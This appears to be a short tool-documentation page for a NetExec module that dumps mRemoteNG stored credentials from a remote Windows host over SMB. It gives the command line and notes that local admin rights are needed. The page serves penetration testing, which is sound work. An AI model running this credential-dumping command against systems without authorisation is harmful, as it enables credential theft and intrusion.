title: Dump mRemoteNG
html:
description: Dump mRemoteNG stored credentials

🆕 Dump mRemoteNG

Warning

You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account

nxc smb <TARGET> -u <USERNAME> -p <PASSWORD> -M mremoteng
excerpt: description: Dump mRemoteNG stored credentials 🆕 Dump mRemoteNG Warning You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account nxc smb &l
